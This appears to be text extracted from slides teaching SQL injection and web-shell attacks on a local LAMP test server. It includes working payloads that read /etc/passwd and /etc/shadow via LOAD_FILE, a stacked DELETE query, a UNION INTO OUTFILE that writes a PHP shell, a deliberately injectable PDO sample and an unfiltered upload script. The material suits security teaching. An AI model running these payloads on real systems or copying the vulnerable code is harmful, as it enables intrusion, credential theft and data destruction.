URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20NULL%
2CNULL%2CNULL%2CNULL%2CLOAD_FILE%28%27%2Fetc%2Fpasswd%
27%29%3B
SELECT * FROM orders where orderNumber =0 UNION SELECT NULL,NULL,
NULL,NULL,LOAD_FILE('/etc/passwd');
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
postfix:x:108:113::/var/spool/postfix:/bin/false
mysql:x:109:115:MySQL Server,,,:/nonexistent:/bin/false
nemus:x:1002:1002:,,,:/home/nemus:/bin/bash
Read File Limitation
./get_curl.sh "0 UNION SELECT NULL,NULL,NULL,NULL,LOAD_FILE
('/etc/shadow');"
SELECT * FROM orders where orderNumber =0 UNION SELECT NULL,NULL,
NULL,NULL,LOAD_FILE('/etc/shadow’);
Array(
[orderLineNumber] =>
)
#returns no results
MySQL Readable Files of Interest
Files readable from the mysql process.
/etc/passwd
/etc/resolv.conf
/etc/motd
/etc/crontab
/etc/ssh/sshd_config
Ubuntu/Debian
/etc/lsb-release 
/etc/apache2/sites-enabled/000-default.conf
Centos/RHEL
/etc/redhat-release
/etc/httpd/conf/httpd.conf
http://wiki.apache.org/httpd/DistrosDefaultLayout
http://pwnwiki.io/#!privesc/linux/index.md
Gotchas
●
So far the attacker has demonstrated how they can retrieve data out of the 
target, but something seems to be missing.
●
The idea of modifying the data in the database using a SELECT injection 
appears to be a logical next step. Maybe by nesting queries or modifying 
UNION SELECT to include an INSERT or UPDATE statement. 
SQL Nesting/Subquery
● Using a union select the attacker can read data out of 
the database, but cannot insert data into the database. 
● Subqueries are when the results of one query is used 
as parameters of another query. It is possible to nest a 
select statement inside an insert or update statement, 
but it's not possible to nest insert or update statements 
inside a select statement on MySQL 5.4.
References
http://beginner-sql-tutorial.com/sql-subquery.htm
http://dev.mysql.com/doc/refman/5.6/en/subqueries.html
Bobby Drop Tables?
So what about bobby drop tables from xkcd ? 
No talk on SQL Injection would 
be complete without him right?
http://xkcd.com/327/
Query Stacking
Sorry No Bobby Drop Tables Query Stacking with mysqli_query(). 
The mysqli_query driver function doesn’t support query stacking. You cannot 
simply end the first query with a semicolon and start another one,but depending 
on the driver this is possible on other platforms. 
●
http://www.sqlinjection.net/stacked-queries/
root@testbox:/# ./get_curl.sh "1;  DELETE FROM orders" 
http://127.0.0.1/get.php?id=1%3B%20%20DELETE%20FROM%20orders
SELECT * FROM orders where orderNumber =1;  DELETE FROM orders
Invalid sql
Other PHP function are acceptable to query stacking such as MultiQuery and 
PDO
●
http://se2.php.net/manual/en/mysqli.multi-query.php
The attacker might be able to modify data if they can create a stored 
procedures, but that is beyond the scope of this presentation 
Addendum 1
It should be noted that the php multi-query 
function is used for optimizing performance on 
sql statements.
Also, the MySQL PDO driver does support 
query stacking. So if you are testing a system 
for SQLi it's worth trying to see if they used 
PDO incorrectly. 
Addendum 1 Continued
setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    echo "PDO connection object created\n";
}
catch(PDOException $e){
    echo $e->getMessage();
}
//bad query injectable and vulnerable to query stacking
$stmt = $dbh->query("SELECT * FROM orders where orderNumber = ".$_GET['id']);
print_r($_GET);
if(isset($_GET['id'])){
    $stmt->execute();
    while($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        echo print_r($row);
    }   
}
//close PDO connection
$dbh = null;
?>
Remote Code Execution
With all the details they have about the system and possibly user 
accounts the attacker moves on to uploading backdoors on to the target 
system.  
Web Shells
● Web shells are executable programs or scripts  when 
uploaded to a target server can be executed using a 
browser. They usually provide a web based interface so 
that an attacker can execute system commands.
● For the web shell to work the target server must support 
the programing language used by the shell so for PHP 
application an attacker will need a PHP web shells. 
○ http://www.binarytides.com/web-shells-tutorial/
PHP Web Shells Functions
To be able to take control and execute commands or code on the system the attacker will need to craft 
a webshell that can be uploaded to the web server.
Php Command Execution
exec          
Returns last line of commands output
passthru      
Passes commands output directly to the browser
system       
Passes commands output directly to the browser and returns last
shell_exec    
Returns commands output
`` (backticks)  
Same as shell_exec()
popen      
Opens read or write pipe to process of a command
proc_open      
Similar to popen() but greater degree of control
pcntl_exec
Executes a program
More PHP Webshell Functions
Used to run code sent to the target server by interpreting strings.
●
eval() - Runs PHP code sent via a string to the function. 
●
assert()  - Identical to eval()
●
preg_replace('/.*/e',...,....) - /e does an eval() on the match
●
create_function() - creates a function from the string
●
$_GET['func_name']($_GET['argument']); -  Converts string variables to 
function arguments
http://stackoverflow.com/questions/3115559/exploitable-php-functions
Addendum 2
These Function can download remote php script and execute them in older 
version of PHP such as php 5.2 
●
include()
●
include_once()
●
require()
●
require_once()
http://php.net/manual/en/filesystem.configuration.php
New version of php such as 5.2 > require that allow_url_include option be set 
inside the php.ini file before they can import code remotely. So this “feature” is 
turned off by default. So if you plan on included code remotely you would need 
to change the php.ini config then restart the services.
Addendum 2 Continued.
Example Web Shell
Simple Shell
http://10.254.10.6/uploads/shell.php?cmd=ls
Output:  2092.jpg 2105.jpg shell.php 
- Executes php code
- Executes php code 
More Web shells - From Irongeek
●
http://www.irongeek.com/i.php?page=webshells-and-rfis
Laudanum- Library of Webshells
●
http://sourceforge.net/projects/laudanum/
Addendum 3
# curl http://somesite/shell.php
More info http://www.madirish.net/402
Output…
mysqli
MysqlI Support => enabled
Client API library version => 5.1.54
Active Persistent Links => 0
...
Remote Code Attacks
There exists a multitudes of attacks they can attempt, but 
for this demonstration our attacker will focus on three.
● First they will try and upload a backdoor PHP script via 
the MySQL write function.
● Second they will try and upload a backdoor using the 
applications upload feature.
● Third they will explore a social engineering attack using 
unix wildcards.
Writing Files
./get_curl.sh "0 UNION SELECT NULL,NULL,NULL,NULL, '' INTO OUTFILE '/tmp/shell.php';""
URL:http://127.0.0.1/get.php?id=0%20UNION%20SELECT%20NULL%
2CNULL%2CNULL%2CNULL%2C%20%27%3C%3F%20system%28%5B%
5C%27c%5C%27%5D%29%3B%20%3F%3E%27%20INTO%20OUTFILE%
20%27%2Ftmp%2Fshell.php%27%3B
SELECT * FROM orders where orderNumber =0 UNION SELECT NULL,NULL,
NULL,NULL, '' INTO OUTFILE '/tmp/shell.php';
Possible Write Points 
To upload a malicious PHP script, the attacker needs a directory with write 
permission turned on. Temporary directories used by popular Content 
Management Systems are a good entry point.  
Sometimes system administrators will chmod 777 a file. If the attacker can find 
a directory that has global write access in the url path they can overwrite the file 
using the MySQL write file and possibly execute it by calling the code from a 
http request.
Possible URl Paths
●
/var/www/html/templates_compiled/
●
/var/www/html/templates_c/
●
/var/www/html/templates/
●
/var/www/html/temporary/
●
/var/www/html/images/
●
/var/www/html/cache/
●
/var/www/html/temp/
●
/var/www/html/files/
MySQL Writable File Directories
root@ubuntu:/# find / -user mysql
Directors of interest
○ /var/lib/mysql/
○ /var/log/mysql/
○ /run/mysqld/
○ /tmp
Remote Code Execution
Remote code execution on LAMP is limited because of the 
isolation of the MySQL user from the Apache user. The 
only writeable directory the processes share is /tmp and 
that directory cannot be accessed via a url on the default 
setup of Apache. Files created by the MySQL process are 
not set to be executable and are owned by the user the 
MySQL process is running as.
More detail can be found here.
●
http://www.blackhat.com/presentations/bh-usa-
09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-PAPER.pdf
Application Upload Features
Using the data found when the attacker stole data from the database they might 
able to obtain access to a user account.
Considering that most applications have a file upload feature the attacker could 
then use this feature to install a webshell.
Most applications will block attempts to upload .php extension files, but they 
might be able to bypass these filters if they are in place.
File Filter Bypass Examples 
●
https://www.owasp.org/index.php/Unrestricted_File_Upload
●
http://www.slideshare.net/mukech/bypass-file-upload-restrictions
●
http://pentestlab.wordpress.com/2012/11/29/bypassing-file-upload-
restrictions/
Upload PHP Code
  Please choose a file: 
<?PHP
if(isset($_FILES['uploadFile']['name'])){
    $target_dir = "uploads/";
    $target_dir = $target_dir . basename( $_FILES["uploadFile"]["name"]);
    $uploadOk=1;
    if (move_uploaded_file ($_FILES["uploadFile"]["tmp_name"], 
$target_dir)) {
        echo "The file has been uploaded." ;
    } else {